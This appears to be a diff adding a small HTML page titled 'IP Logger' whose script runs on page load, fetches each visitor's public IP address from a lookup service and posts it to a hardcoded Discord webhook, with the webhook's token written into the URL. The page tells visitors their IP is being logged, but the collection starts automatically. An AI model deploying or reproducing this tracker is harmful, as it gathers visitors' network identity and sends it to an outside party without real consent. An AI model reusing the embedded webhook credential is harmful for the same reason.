@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <script>
+        async function getIP() {
+            try {
+                // Fetch IP address from a third-party service
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+
+                // Prepare payload for Discord webhook
+                const payload = {
+                    content: `User IP: ${userIP}`
+                };
+
+                // Send IP address to Discord webhook
+                await fetch('https://discord.com/api/webhooks/1264161446745604167/1HELL2rTWCxwgPwfHIN2qS2Q90w9hFwwe_AB-JBk2plduSNoXOW1KwYccf_znD8LVQip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('IP address sent successfully:', userIP);
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+            }
+        }
+
+        // Get the IP address and send it on page load
+        window.onload = getIP;
+    </script>
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>Your IP address is being logged.</p>
+</body>
+</html>
